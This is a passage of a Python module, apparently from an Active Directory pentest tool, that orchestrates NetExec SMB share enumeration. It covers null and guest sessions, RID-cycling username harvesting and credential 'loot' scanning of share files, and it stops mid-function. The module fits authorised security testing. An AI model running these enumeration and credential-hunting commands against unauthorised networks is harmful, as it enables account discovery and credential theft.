"""SMB CLI orchestration helpers.

This module extracts SMB-related orchestration logic out of the monolithic
`adscan.py` so it can be reused by future UX layers while keeping runtime
behaviour stable for the current CLI.

Note: This module handles SMB enumeration and operations. For credential
extraction operations (dumps), see `dumps.py`.
"""

from __future__ import annotations

from typing import Any, Callable
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from functools import partial
from pathlib import Path
import csv
import json
import os
import re
import shlex
import threading
import time
import traceback
import shutil
import rich
from rich.panel import Panel
from rich.prompt import Confirm, Prompt
from rich.table import Table
from rich.text import Text

from adscan_internal import (
    print_error,
    print_error_debug,
    print_exception,
    print_info,
    print_info_debug,
    print_instruction,
    print_info_verbose,
    print_panel,
    print_operation_header,
    print_success,
    print_warning,
    print_warning_debug,
    telemetry,
)
from adscan_internal.integrations.netexec.parsers import (
    parse_smb_share_map,
    parse_smb_usernames,
    parse_smb_user_descriptions,
    summarize_share_map,
)
from adscan_internal.text_utils import strip_ansi_codes
from adscan_internal.interaction import is_non_interactive
from adscan_internal.cli.target_scope_warning import (
    confirm_large_target_scope,
)
from adscan_internal.cli.ntlm_hash_finding_flow import (
    render_ntlm_hash_findings_flow,
)
from adscan_internal.cli.scan_outcome_flow import (
    artifact_records_extracted_nothing,
    collect_loot_file_preview,
    persist_artifact_processing_report as _persist_artifact_processing_report,
    render_artifact_processing_summary as _render_artifact_processing_summary,
    render_no_extracted_findings_preview,
)
from adscan_internal.rich_output import (
    BRAND_COLORS,
    mark_sensitive,
    print_panel_with_table,
)
from adscan_internal.services.smb_guest_auth_service import (
    is_guest_alias,
    resolve_smb_guest_username,
)
from adscan_internal.services.credsweeper_service import (
    CREDSWEEPER_RULES_PROFILE_FILESYSTEM_DOC,
    CREDSWEEPER_RULES_PROFILE_FILESYSTEM_TEXT,
    get_default_credsweeper_jobs,
    get_default_credsweeper_timeout,
)
from adscan_internal.services.smb_exclusion_policy import (
    GLOBAL_SMB_EXCLUDE_FILTER_TOKENS,
    GLOBAL_SMB_HEAVY_ARTIFACT_MAX_FILESIZE_MB,
    GLOBAL_SMB_MAPPING_EXCLUDED_EXTENSIONS,
    build_manspider_exclusion_args,
    filter_share_map_by_global_smb_exclusions,
    filter_shares_by_global_smb_exclusions,
    is_globally_excluded_smb_share,
    is_globally_excluded_smb_relative_path,
    prune_excluded_walk_dirs,
)
from adscan_internal.services.smb_sensitive_file_policy import (
    DEFAULT_SMB_SENSITIVE_FILE_PROFILE,
    SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED,
    SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY,
    SMB_SENSITIVE_BENCHMARK_SCOPE_DOCUMENTS_DEPTH_EXPERIMENTAL,
    SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY,
    SMB_SENSITIVE_FILE_PROFILE_DOCUMENTS_ONLY,
    SMB_SENSITIVE_FILE_PROFILE_TEXT_ONLY,
    SMB_SENSITIVE_FILE_PROFILE_TEXT_AND_DOCUMENTS,
    SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
    SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
    get_sensitive_benchmark_profile,
    get_manspider_phase_extensions,
    get_manspider_sensitive_extensions,
    get_production_sensitive_scan_phase_sequence,
    get_sensitive_phase_definition,
    get_sensitive_phase_extensions,
    get_sensitive_phase_max_file_size_bytes,
    get_sensitive_file_extensions,
    resolve_effective_sensitive_extension,
)
from adscan_internal.services.rclone_tuning_service import (
    RcloneCatTuning,
    RcloneTuning,
    choose_rclone_cat_tuning,
    choose_rclone_tuning,
)
from adscan_internal.services.artifact_processing_tuning_service import (
    choose_artifact_processing_tuning,
)
from adscan_internal.services.loot_credential_analysis_service import (
    ENGINE_AI as _SMB_LOOT_ANALYSIS_ENGINE_AI,
    ENGINE_BOTH as _SMB_LOOT_ANALYSIS_ENGINE_BOTH,
    ENGINE_CREDSWEEPER as _SMB_LOOT_ANALYSIS_ENGINE_CREDSWEEPER,
    merge_grouped_credential_findings as _merge_grouped_credential_findings,
    run_loot_credential_analysis,
    select_loot_credential_analysis_engine as _select_loot_credential_analysis_engine,
)
from adscan_internal.services.smb_sensitive_phase_orchestration_service import (
    run_staged_smb_sensitive_scan as _run_staged_smb_sensitive_scan,
    should_continue_with_deeper_sensitive_scan as _service_should_continue_with_deeper_sensitive_scan,
    should_continue_with_heavy_artifact_analysis as _service_should_continue_with_heavy_artifact_analysis,
    should_run_credential_phase as _service_should_run_credential_phase,
    should_skip_sensitive_scan_prompt_for_ctf_pwned as _service_should_skip_sensitive_scan_prompt_for_ctf_pwned,
)
from adscan_internal.services.spidering_service import ArtifactProcessingRecord
from adscan_internal.workspaces.computers import (
    count_target_file_entries,
    consume_service_targeting_fallback_notice,
    ensure_enabled_computer_ip_file,
    resolve_domain_service_scope_preference,
    resolve_domain_service_target_file,
)
from adscan_internal.workspaces.subpaths import domain_path, domain_relpath

_SMB_HOST_IDENTITY_RE = re.compile(
    r"^\s*SMB\s+(?P<ip>\d{1,3}(?:\.\d{1,3}){3})\s+\d+\s+(?P<hostname>\S+)\s+"
)
_SMB_GUEST_SESSION_RE = re.compile(
    r"^\s*SMB\s+(?P<ip>\d{1,3}(?:\.\d{1,3}){3})\s+\d+\s+(?P<hostname>\S+)\s+"
    r"\[\+\].*\(\s*Guest\s*\)",
    re.IGNORECASE,
)
_SMB_TARGET_SCOPE_WARNING_THRESHOLD = 2048
_SMB_MAPPING_MODE_AUTO = "auto"
_SMB_MAPPING_MODE_REFRESH = "refresh"
_SMB_MAPPING_MODE_REUSE = "reuse"
_VALID_SMB_MAPPING_MODES = {
    _SMB_MAPPING_MODE_AUTO,
    _SMB_MAPPING_MODE_REFRESH,
    _SMB_MAPPING_MODE_REUSE,
}
_SMB_RCLONE_MAPPING_CACHE_MAX_AGE_AUDIT = timedelta(hours=4)


def _is_globally_excluded_mapping_share(share_name: str) -> bool:
    """Return True when share is excluded by global SMB mapping policy."""
    return is_globally_excluded_smb_share(share_name)


def _filter_shares_by_global_mapping_exclusions(shares: list[str]) -> list[str]:
    """Filter share names according to global SMB mapping exclusions."""
    return filter_shares_by_global_smb_exclusions(shares)


def _filter_share_map_by_global_mapping_exclusions(
    share_map: dict[str, dict[str, str]] | None,
) -> dict[str, dict[str, str]] | None:
    """Filter host/share permissions map according to global mapping exclusions."""
    return filter_share_map_by_global_smb_exclusions(share_map)


def _unique_casefold_sorted(values: list[str]) -> list[str]:
    """Return a deterministic, case-insensitive normalized list of strings."""
    normalized = {
        str(value).strip().casefold() for value in values if str(value).strip()
    }
    return sorted(normalized)


def _normalize_host_share_permissions(
    share_map: dict[str, dict[str, str]] | None,
) -> dict[str, dict[str, str]]:
    """Normalize one host/share permission map for stable cache comparisons."""
    normalized: dict[str, dict[str, str]] = {}
    for host_name, share_permissions in dict(share_map or {}).items():
        normalized_host = str(host_name or "").strip().casefold()
        if not normalized_host or not isinstance(share_permissions, dict):
            continue
        for share_name, permission in share_permissions.items():
            normalized_share = str(share_name or "").strip().casefold()
            normalized_permission = str(permission or "").strip()
            if not normalized_share or not normalized_permission:
                continue
            normalized.setdefault(normalized_host, {})[normalized_share] = (
                normalized_permission
            )
    return normalized


def _build_smb_rclone_mapping_cache_metadata(
    *,
    domain: str,
    username: str,
    hosts: list[str],
    shares: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
) -> dict[str, object]:
    """Build one stable SMB rclone mapping cache metadata snapshot."""
    return {
        "domain": str(domain or "").strip().casefold(),
        "principal": f"{domain}\\{username}".strip().casefold(),
        "requested_hosts": _unique_casefold_sorted(hosts),
        "requested_shares": _unique_casefold_sorted(shares),
        "host_share_permissions": _normalize_host_share_permissions(share_map),
    }


def _parse_smb_cache_timestamp(value: str) -> datetime | None:
    """Parse one persisted SMB cache timestamp into UTC."""
    normalized = str(value or "").strip()
    if not normalized:
        return None
    try:
        parsed = datetime.fromisoformat(normalized)
    except ValueError:
        return None
    if parsed.tzinfo is None:
        return parsed.replace(tzinfo=timezone.utc)
    return parsed.astimezone(timezone.utc)


def _resolve_smb_mapping_cache_age_seconds(timestamp: str) -> float | None:
    """Resolve cache age in seconds for one SMB mapping timestamp."""
    parsed = _parse_smb_cache_timestamp(timestamp)
    if parsed is None:
        return None
    return max(0.0, (datetime.now(timezone.utc) - parsed).total_seconds())


def _resolve_smb_mapping_mode(shell: Any) -> str:
    """Resolve the SMB mapping cache policy override for one workflow run."""
    shell_override = str(getattr(shell, "smb_mapping_cache_mode", "") or "").strip().lower()
    if shell_override in _VALID_SMB_MAPPING_MODES:
        return shell_override
    env_override = str(os.environ.get("ADSCAN_SMB_MAPPING_MODE", "") or "").strip().lower()
    if env_override in _VALID_SMB_MAPPING_MODES:
        return env_override
    return _SMB_MAPPING_MODE_AUTO


def _is_dev_cache_selection_mode(shell: Any) -> bool:
    """Return True when dev mode should surface explicit cache reuse UX."""
    session_env = str(os.getenv("ADSCAN_SESSION_ENV", "") or "").strip().lower()
    shell_env = str(getattr(shell, "session_env", "") or "").strip().lower()
    return session_env == "dev" or shell_env == "dev"


def _select_dev_cache_action(
    *,
    shell: Any,
    title: str,
    summary_lines: list[str],
) -> str:
    """Ask one explicit cache action in dev mode when interactive selectors exist."""
    if not _is_dev_cache_selection_mode(shell):
        return "auto"
    selector = getattr(shell, "_questionary_select", None)
    if not callable(selector):
        print_info_debug(
            "Dev cache selection skipped because no interactive selector is available."
        )
        return "auto"
    prompt_title = title
    if summary_lines:
        prompt_title = f"{title}\n" + "\n".join(summary_lines)
    options = [
        "Reuse cached results (default)",
        "Refresh now",
    ]
    selected_idx = selector(prompt_title, options, default_idx=0)
    if selected_idx is None:
        return "auto"
    if selected_idx == 1:
        return "refresh"
    return "reuse"


def _count_smb_mapping_file_entries(
    *,
    cache_payload: dict[str, object],
    hosts: list[str],
    shares: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
) -> int:
    """Count file entries relevant to the current SMB mapping scope."""
    hosts_bucket = dict(cache_payload.get("hosts") or {})
    requested_hosts = set(_unique_casefold_sorted(hosts))
    requested_shares = set(_unique_casefold_sorted(shares))
    normalized_share_map = _normalize_host_share_permissions(share_map)
    total_entries = 0

    for host_name, host_entry in hosts_bucket.items():
        normalized_host = str(host_name or "").strip().casefold()
        if requested_hosts and normalized_host not in requested_hosts:
            continue
        if not isinstance(host_entry, dict):
            continue
        shares_bucket = dict(host_entry.get("shares") or {})
        allowed_host_shares = set(normalized_share_map.get(normalized_host, {}))
        for share_name, share_entry in shares_bucket.items():
            normalized_share = str(share_name or "").strip().casefold()
            if requested_shares and normalized_share not in requested_shares:
                continue
            if allowed_host_shares and normalized_share not in allowed_host_shares:
                continue
            if not isinstance(share_entry, dict):
                continue
            files_bucket = dict(share_entry.get("files") or {})
            total_entries += len(files_bucket)
    return total_entries


def _is_smb_rclone_mapping_cache_compatible(
    *,
    cache_payload: dict[str, object],
    expected_metadata: dict[str, object],
) -> tuple[bool, str, str | None]:
    """Validate whether one persisted SMB rclone mapping can be reused safely."""
    schema_version = int(cache_payload.get("schema_version") or 0)
    if schema_version != 1:
        return False, "schema version mismatch", None
    cached_domain = str(cache_payload.get("domain") or "").strip().casefold()
    if cached_domain != str(expected_metadata.get("domain") or "").strip().casefold():
        return False, "domain mismatch", None

    principal_key = str(expected_metadata.get("principal") or "").strip()
    principals_bucket = dict(cache_payload.get("principals") or {})
    matched_principal_key = next(
        (
            cached_key
            for cached_key in principals_bucket
            if str(cached_key or "").strip().casefold() == principal_key
        ),
        None,
    )
    if not matched_principal_key:
        return False, "principal not found", None
    principal_bucket = principals_bucket.get(matched_principal_key)
    if not isinstance(principal_bucket, dict):
        return False, "principal bucket missing", None

    expected_hosts = list(expected_metadata.get("requested_hosts") or [])
    expected_shares = list(expected_metadata.get("requested_shares") or [])
    cached_runs = list(cache_payload.get("runs") or [])
    matching_run: dict[str, object] | None = None
    for run_entry in reversed(cached_runs):
        if not isinstance(run_entry, dict):
            continue
        cached_principal = str(run_entry.get("principal") or "").strip().casefold()
        if cached_principal != principal_key:
            continue
        if _unique_casefold_sorted(list(run_entry.get("requested_hosts") or [])) != expected_hosts:
            continue
        if _unique_casefold_sorted(list(run_entry.get("requested_shares") or [])) != expected_shares:
            continue
        matching_run = run_entry
        break
    if matching_run is None:
        return False, "no matching run metadata", None

    cached_permissions = _normalize_host_share_permissions(
        principal_bucket.get("host_share_permissions")
        if isinstance(principal_bucket.get("host_share_permissions"), dict)
        else {}
    )
    expected_permissions = dict(expected_metadata.get("host_share_permissions") or {})
    for host_name, share_permissions in expected_permissions.items():
        cached_host_permissions = cached_permissions.get(str(host_name or "").strip().casefold(), {})
        for share_name, permission in dict(share_permissions).items():
            cached_permission = cached_host_permissions.get(str(share_name or "").strip().casefold())
            if cached_permission != str(permission or "").strip():
                return False, "host/share permission mismatch", None

    hosts_bucket = dict(cache_payload.get("hosts") or {})
    if expected_permissions:
        for host_name, share_permissions in expected_permissions.items():
            matched_host_key = next(
                (
                    cached_host
                    for cached_host in hosts_bucket
                    if str(cached_host or "").strip().casefold()
                    == str(host_name or "").strip().casefold()
                ),
                None,
            )
            if not matched_host_key:
                return False, "expected host missing from mapping", None
            host_entry = hosts_bucket.get(matched_host_key)
            if not isinstance(host_entry, dict):
                return False, "expected host entry missing", None
            shares_bucket = dict(host_entry.get("shares") or {})
            for share_name in dict(share_permissions):
                share_exists = any(
                    str(cached_share or "").strip().casefold()
                    == str(share_name or "").strip().casefold()
                    for cached_share in shares_bucket
                )
                if not share_exists:
                    return False, "expected share missing from mapping", None

    cache_timestamp = str(matching_run.get("timestamp") or cache_payload.get("updated_at") or "").strip() or None
    return True, "compatible", cache_timestamp


def _resolve_smb_rclone_phase_cache_paths(
    shell: Any,
    *,
    domain: str,
    username: str,
    phase: str,
) -> dict[str, str]:
    """Resolve stable cache paths for one SMB rclone deterministic phase."""
    workspace_cwd = shell._get_workspace_cwd()
    cache_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "cache",
        _slugify_token(username),
        phase,
    )
    return {
        "cache_root_abs": cache_root_abs,
        "cache_root_rel": domain_relpath(
            shell.domains_dir,
            domain,
            shell.smb_dir,
            "rclone",
            "cache",
            _slugify_token(username),
            phase,
        ),
        "loot_dir": os.path.join(cache_root_abs, "loot"),
        "credsweeper_dir": os.path.join(cache_root_abs, "credsweeper"),
        "manifest_path": os.path.join(cache_root_abs, "phase_cache_manifest.json"),
    }


def _resolve_smb_loot_ai_history_path(
    shell: Any,
    *,
    domain: str,
    username: str,
    phase: str,
    backend: str,
) -> str:
    """Resolve one persistent history file for SMB loot-path AI analysis."""
    workspace_cwd = shell._get_workspace_cwd()
    return domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        backend,
        "ai_history",
        _slugify_token(username),
        phase,
        "analysis_history.json",
    )

def _deserialize_cached_artifact_records(
    payload: list[dict[str, Any]] | None,
) -> list[ArtifactProcessingRecord]:
    """Restore serialized artifact cache payloads into record objects."""
    records: list[ArtifactProcessingRecord] = []
    for item in list(payload or []):
        if not isinstance(item, dict):
            continue
        records.append(
            ArtifactProcessingRecord(
                path=str(item.get("path", "") or "").strip(),
                filename=str(item.get("filename", "") or "").strip(),
                artifact_type=str(item.get("artifact_type", "") or "").strip(),
                status=str(item.get("status", "") or "").strip(),
                note=str(item.get("note", "") or "").strip(),
                manual_review=bool(item.get("manual_review", False)),
                details=dict(item.get("details") or {}),
            )
        )
    return records


def execute_netexec_shares(
    shell: Any,
    *,
    command: str,
    domain: str,
    username: str,
    password: str,
) -> None:
    """Execute a NetExec SMB share enumeration and render the results.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        command: Full NetExec command to run.
        domain: Target domain.
        username: Session username label (e.g., "null", "guest", actual user).
        password: Session password/hash (for follow-up actions).
    """

    def _extract_log_path(cmd: str) -> str | None:
        try:
            parts = shlex.split(cmd)
        except ValueError:
            return None
        if "--log" in parts:
            idx = parts.index("--log")
            if idx + 1 < len(parts):
                return str(parts[idx + 1])
        return None

    try:
        completed_process = shell._run_netexec(command, domain=domain, pre_sync=False)
        output = completed_process.stdout if completed_process else ""

        if completed_process and completed_process.returncode == 0:
            output_str = output
            if "[ADSCAN] NETEXEC_SKIPPED_DUE_TO_TIMEOUT" in output_str:
                marked_domain = mark_sensitive(domain, "domain")
                marked_username = mark_sensitive(username, "user")
                print_warning(
                    "Skipped SMB shares enumeration for "
                    f"{marked_domain} as {marked_username} due to repeated timeouts."
                )
                return

            if "STATUS_NOT_SUPPORTED" in output_str:
                print_info_verbose(
                    "NTLM does not support shares enumeration. Using kerberos instead."
                )
                auth = shell.build_auth_nxc(username, password, domain, kerberos=True)
                log_path = domain_relpath(
                    shell.domains_dir, domain, "smb", f"smb_{username}_shares.log"
                )
                command_fallback = (
                    f"{shell.netexec_path} smb enabled_computers.txt {auth} "
                    f"-t 10 --timeout 60 --smb-timeout 30 --shares --log "
                    f"{log_path} "
                )
                execute_netexec_shares(
                    shell,
                    command=command_fallback,
                    domain=domain,
                    username=username,
                    password=password,
                )
                return

            has_auth_failures = (
                "STATUS_LOGON_FAILURE" in output_str
                or "STATUS_ACCESS_DENIED" in output_str
            )
            if has_auth_failures and not _has_any_accepted_share_session(output_str):
                marked_username = mark_sensitive(username, "user")
                marked_domain = mark_sensitive(domain, "domain")
                print_error(
                    f"{marked_username} sessions not accepted on any share of {marked_domain}"
                )
                return

            host_identity = _extract_smb_host_identity_map(output_str)
            share_map = parse_smb_share_map(output_str)
            guest_session_hosts = _extract_guest_session_hosts(output_str)
            read_shares, write_shares, read_hosts, _write_hosts = summarize_share_map(
                share_map
            )

            if share_map:
                ip_table = Table(
                    title=(
                        f"[bold cyan]SMB Shares discovered on {domain} "
                        f"({username} session)[/bold cyan]"
                    ),
                    header_style="bold magenta",
                    box=rich.box.SIMPLE_HEAVY,
                )
                ip_table.add_column("Hostname", style="cyan")
                ip_table.add_column("IP", style="bright_cyan")
                ip_table.add_column("Share", style="cyan")
                ip_table.add_column("Permission", style="green")

                priority_shares = ["SYSVOL", "NETLOGON"]
                for host in sorted(share_map.keys()):
                    shares_dict = share_map[host]
                    ordered = [s for s in priority_shares if s in shares_dict] + sorted(
                        [s for s in shares_dict if s not in priority_shares]
                    )
                    first = True
                    for share_name in ordered:
                        perm = shares_dict[share_name]
                        col = "magenta" if "WRITE" in perm else "cyan"
                        host_name = host_identity.get(host, host)
                        ip_table.add_row(
                            host_name if first else "",
                            host if first else "",
                            share_name,
                            f"[{col}]{perm}[/{col}]",
                        )
                        first = False
                shell.console.print(Panel(ip_table, border_style="bright_blue"))
            else:
                shell.console.print(
                    Panel(
                        Text(
                            "No SMB shares with READ or WRITE permissions were found.",
                            style="yellow",
                        ),
                        border_style="yellow",
                    )
                )
                if (
                    guest_session_hosts
                    and str(username or "").strip().lower() == "guest"
                ):
                    marked_domain = mark_sensitive(domain, "domain")
                    print_info(
                        "Guest sessions were accepted on one or more hosts in "
                        f"{marked_domain}, but no share with READ/WRITE permissions was found."
                    )

            if (read_shares or write_shares) and shell.domains_data[domain][
                "auth"
            ] != "auth":
                shell.domains_data[domain]["auth"] = username

            if (share_map or guest_session_hosts) and str(
                username or ""
            ).strip().lower() == "guest":
                log_path = _extract_log_path(command)
                if guest_session_hosts:
                    guest_hosts = sorted(guest_session_hosts.keys())
                else:
                    guest_hosts = sorted(share_map.keys())
                guest_host_labels = []
                for host_ip in guest_hosts:
                    host_name = guest_session_hosts.get(
                        host_ip, host_identity.get(host_ip, host_ip)
                    )
                    guest_host_labels.append(f"{host_name} ({host_ip})")
                shell.update_report_field(domain, "smb_guest_shares", guest_host_labels)
                try:
                    from adscan_internal.services.report_service import (
                        record_technical_finding,
                    )

                    host_samples: list[dict[str, Any]] = []
                    for host_ip in guest_hosts[:50]:
                        shares = share_map.get(host_ip, {})
                        host_samples.append(
                            {
                                "ip": host_ip,
                                "hostname": guest_session_hosts.get(
                                    host_ip, host_identity.get(host_ip, host_ip)
                                ),
                                "share_count": len(shares),
                                "shares": [
                                    {"name": name, "permission": perm}
                                    for name, perm in sorted(shares.items())[:50]
                                ],
                            }
                        )

                    record_technical_finding(
                        shell,
                        domain,
                        key="smb_guest_shares",
                        value=guest_host_labels,
                        details={
                            "hosts_with_guest_access": len(guest_hosts),
                            "hosts_with_guest_share_permissions": sum(
                                1 for host_ip in guest_hosts if share_map.get(host_ip)
                            ),
                            "shares_with_permissions": sum(
                                len(share_map.get(host_ip, {}))
                                for host_ip in guest_hosts
                            ),
                            "host_samples": host_samples,
                            "truncated_hosts": len(guest_hosts) > 50,
                        },
                        evidence=[
                            {
                                "type": "log",
                                "summary": "SMB guest session share enumeration output",
                                "artifact_path": log_path,
                            }
                        ]
                        if log_path
                        else None,
                    )
                except Exception as exc:  # pragma: no cover
                    telemetry.capture_exception(exc)

            if read_shares:
                shell.ask_for_smb_shares_read(
                    domain,
                    read_shares,
                    username,
                    password,
                    list(read_hosts),
                    share_map=share_map,
                )
            return

        marked_domain = mark_sensitive(domain, "domain")
        marked_username = mark_sensitive(username, "user")
        print_error(
            f"Error executing netexec in domain {marked_domain} with a {marked_username} session."
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_error("An error occurred while executing the command.")
        print_exception(show_locals=False, exception=exc)


def _has_any_accepted_share_session(output: str) -> bool:
    """Return True when share enumeration shows at least one accepted session.

    NetExec share scans can contain mixed outcomes across hosts in the same run.
    We only want a global "sessions not accepted" error when every host fails.
    """
    if not output:
        return False

    for raw_line in output.splitlines():
        line = strip_ansi_codes(raw_line or "").strip()
        if not line:
            continue
        lowered = line.lower()

        if "enumerated shares" in lowered:
            return True

        if "[+]" in line and (
            "(guest)" in lowered
            or "(pwn3d" in lowered
            or " status_success" in lowered
            or " no password" in lowered
        ):
            return True

    return False


def _extract_smb_host_identity_map(output: str) -> dict[str, str]:
    """Extract SMB IP->hostname labels from NetExec output lines."""
    identity: dict[str, str] = {}
    if not output:
        return identity
    for raw_line in output.splitlines():
        line = strip_ansi_codes(raw_line or "").strip()
        if not line:
            continue
        match = _SMB_HOST_IDENTITY_RE.match(line)
        if not match:
            continue
        ip = str(match.group("ip") or "").strip()
        hostname = str(match.group("hostname") or "").strip()
        if not ip or not hostname:
            continue
        identity[ip] = hostname
    return identity


def _extract_guest_session_hosts(output: str) -> dict[str, str]:
    """Extract hosts where NetExec explicitly reports a successful guest session."""
    hosts: dict[str, str] = {}
    if not output:
        return hosts
    for raw_line in output.splitlines():
        line = strip_ansi_codes(raw_line or "").strip()
        if not line:
            continue
        match = _SMB_GUEST_SESSION_RE.match(line)
        if not match:
            continue
        ip = str(match.group("ip") or "").strip()
        hostname = str(match.group("hostname") or "").strip()
        if not ip:
            continue
        hosts[ip] = hostname or ip
    return hosts


def _build_guest_auth_nxc(shell: Any, *, domain: str) -> str:
    """Build NetExec auth args for guest-session transport using shared config."""
    guest_username = resolve_smb_guest_username(shell=shell, domain=domain)
    return shell.build_auth_nxc(guest_username, "", domain)


def execute_smb_rid_cycling(shell: Any, *, command: str, domain: str) -> None:
    """Execute RID cycling via NetExec and store discovered usernames.

    Refactored to use RIDCyclingService from services.enumeration.rid_cycling
    for better separation of concerns and reusability.

    Args:
        shell: The active `PentestShell` instance (from `adscan.py`).
        command: Full NetExec command to run.
        domain: Target domain.
    """
    from adscan_internal.services.enumeration.rid_cycling import RIDCyclingService

    try:
        # Extract PDC and auth args from command
        # Command format: {netexec_path} smb {pdc} {auth_args} --rid-brute {max_rid} --log {log}
        parts = command.split()
        pdc_index = -1
        auth_start = -1
        for i, part in enumerate(parts):
            if part == "smb" and i + 1 < len(parts):
                pdc_index = i + 1
            elif part.startswith("-u") and auth_start == -1:
                auth_start = i

        if pdc_index == -1 or pdc_index >= len(parts):
            print_error("Could not parse PDC from RID cycling command")
            return

        pdc = parts[pdc_index]
        max_rid = 2000
        auth_args = _build_guest_auth_nxc(shell, domain=domain)

        # Extract max_rid from command
        for i, part in enumerate(parts):
            if part == "--rid-brute" and i + 1 < len(parts):
                try:
                    max_rid = int(parts[i + 1])
                except ValueError:
                    pass
            elif part.startswith("-u") and i + 1 < len(parts):
                # Extract auth args: -u 'value' -p 'value'
                auth_parts = []
                j = i
                while j < len(parts) and j < i + 5:
                    auth_parts.append(parts[j])
                    if parts[j].startswith("-p"):
                        if j + 1 < len(parts):
                            auth_parts.append(parts[j + 1])
                        break
                    j += 1
                if auth_parts:
                    auth_args = " ".join(auth_parts)

        # Check for --local-auth flag
        has_local_auth = "--local-auth" in parts
        if has_local_auth:
            auth_args += " --local-auth"

        # Use RIDCyclingService for initial enumeration
        get_license_mode = getattr(shell, "_get_license_mode_enum", None)
        if callable(get_license_mode):
            license_mode = get_license_mode()
        else:
            from adscan_internal.core import LicenseMode

            raw_license = str(getattr(shell, "license_mode", "PRO") or "PRO").upper()
            license_mode = (
                LicenseMode.LITE if raw_license == "LITE" else LicenseMode.PRO
            )

        rid_service = RIDCyclingService(
            event_bus=None,
            license_mode=license_mode,
        )

        result = rid_service.enumerate_users_by_rid(
            domain=domain,
            pdc=pdc,
            netexec_path=shell.netexec_path or "",
            auth_args=auth_args,
            max_rid=max_rid,
            timeout=300,
            scan_id=None,
        )

        output_str = result.raw_output
        if "SidTypeUser" in output_str:
            marked_domain = mark_sensitive(domain, "domain")
            print_success(
                f"RID cycling successful with a guest session on domain {marked_domain}"
            )
            # Expand to 10000 RIDs for full enumeration
            if max_rid < 10000:
                print_info("Enumerating users by RID")
                expanded_result = rid_service.enumerate_users_by_rid(
                    domain=domain,
                    pdc=pdc,
                    netexec_path=shell.netexec_path or "",
                    auth_args=auth_args,
                    max_rid=10000,
                    timeout=300,
                    scan_id=None,
                )
                users = expanded_result.usernames
            else:
                users = result.usernames

            if users:
                shell.domains_data[domain]["auth"] = "guest"
                shell._write_user_list_file(
                    domain,
                    "users.txt",
                    users,
                    merge_existing=True,
                    update_source="SMB RID cycling",
                )
                shell._postprocess_user_list_file(
                    domain,
                    "users.txt",
                    source="smb_rid_cycling",
                )
            return

        if "STATUS_NO_LOGON_SERVERS" in output_str or "NETBIOS" in output_str:
            if not has_local_auth:
                command_added = f"{command} --local-auth"
                execute_smb_rid_cycling(shell, command=command_added, domain=domain)
                return

        marked_domain = mark_sensitive(domain, "domain")
        print_error(
            "Could not obtain usernames through RID cycling with a guest session on domain "
            f"{marked_domain}."
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_error("Error executing RID cycling.")
        print_exception(show_locals=False, exception=exc)


def run_null_shares(shell: Any, *, domain: str) -> None:
    """Run SMB share enumeration via a null session and render results."""
    if shell.type == "ctf" and shell.domains_data[domain]["auth"] in ["auth", "pwned"]:
        return
    if not shell.netexec_path:
        print_error(
            "NetExec (nxc) path not configured. Please ensure it's installed via 'adscan install'."
        )
        return

    print_operation_header(
        "Null Session Share Enumeration",
        details={
            "Domain": domain,
            "PDC": shell.domains_data[domain]["pdc"],
            "Type": "SMB Shares Enumeration",
            "Authentication": "Anonymous (Null Session)",
        },
        icon="📂",
    )

    log_path = domain_relpath(shell.domains_dir, domain, "smb", "smb_null_shares.log")
    command = (
        f"{shell.netexec_path} smb {shell.domains_data[domain]['pdc']} "
        f'-u "" -p "" --shares --log {log_path} '
    )
    print_info_debug(f"Command: {command}")
    execute_netexec_shares(
        shell,
        command=command,
        domain=domain,
        username="null",
        password="",
    )


def _resolve_guest_smb_targets(shell: Any, *, domain: str) -> tuple[list[str], str]:
    """Resolve target tokens for guest SMB enumeration.

    Order of precedence:
    1. Explicit `guest_smb_targets` configured by start_unauth.
    2. Legacy files (`enabled_computers_ips.txt`, then `smb/ips.txt`).
    3. Validated PDC/DC as a last fallback.
    """
    domain_data = (
        shell.domains_data.get(domain, {}) if hasattr(shell, "domains_data") else {}
    )
    configured = domain_data.get("guest_smb_targets")
    tokens: list[str] = []

    if isinstance(configured, list):
        tokens = [str(value).strip() for value in configured if str(value).strip()]
    elif isinstance(configured, str):
        tokens = [
            part.strip() for part in re.split(r"[,\s]+", configured) if part.strip()
        ]

    if tokens:
        return tokens, "configured"

    workspace_dir = getattr(shell, "current_workspace_dir", None) or os.getcwd()
    enabled_computers, enabled_source = ensure_enabled_computer_ip_file(
        workspace_dir,
        shell.domains_dir,
        domain,
        domain_data,
    )
    if enabled_computers:
        return [enabled_computers], enabled_source

    smb_ips = domain_relpath(shell.domains_dir, domain, "smb", "ips.txt")
    if os.path.exists(smb_ips):
        return [smb_ips], "smb_ips_file"

    pdc_ip = str(domain_data.get("pdc", "")).strip()
    if pdc_ip:
        return [pdc_ip], "pdc_fallback"

    return [], "none"


def _normalize_smb_target_tokens(raw_value: Any) -> list[str]:
    """Normalize SMB target tokens from comma/space-separated input."""
    if isinstance(raw_value, (list, tuple, set)):
        source_tokens = [str(item).strip() for item in raw_value if str(item).strip()]
    else:
        raw = str(raw_value or "").strip()
        if not raw:
            return []
        source_tokens = [
            part.strip() for part in re.split(r"[,\s]+", raw) if part.strip()
        ]

    normalized: list[str] = []
    seen: set[str] = set()
    for token in source_tokens:
        key = token.casefold()
        if key in seen:
            continue
        seen.add(key)
        normalized.append(token)
    return normalized


def confirm_large_smb_target_scope(
    shell: Any,
    *,
    targets: list[str],
    prompt_context: str,
) -> bool:
    """Warn before enumerating a very large SMB target scope."""
    if getattr(shell, "auto", False):
        return True
    return confirm_large_target_scope(
        shell,
        targets=targets,
        threshold=_SMB_TARGET_SCOPE_WARNING_THRESHOLD,
        title="[bold yellow]⚠️  SMB Scope Warning[/bold yellow]",
